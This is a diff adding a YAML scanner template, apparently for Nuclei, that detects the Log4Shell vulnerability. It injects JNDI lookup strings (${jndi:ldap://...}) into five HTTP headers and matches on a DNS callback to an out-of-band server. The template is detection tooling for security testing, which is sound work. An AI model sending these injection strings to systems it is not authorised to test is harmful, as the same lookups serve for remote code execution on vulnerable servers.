@@ -1,0 +1,27 @@
+id: log4j-jndi-oob-detect
+
+info:
+  name: Log4Shell JNDI OOB Detection
+  author: 72stack-sec
+  severity: critical
+  description: Log4j JNDI injection detection via interactsh callback across multiple injectable headers. Source payload: playbooks/rce/10-framework.md (log4j-rce) and payloader/waf-bypass.md nested-expression variants.
+  reference:
+    - https://github.com/Little-H-lying-flat/72stack-sec
+  tags: log4j,jndi,rce,oob
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${jndi:ldap://{{interactsh-url}}/x}
+        Referer: ${jndi:ldap://{{interactsh-url}}/r}
+        X-Api-Version: ${jndi:ldap://{{interactsh-url}}/a}
+        X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/f}
+        Accept-Charset: ${jndi:ldap://{{interactsh-url}}/c}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
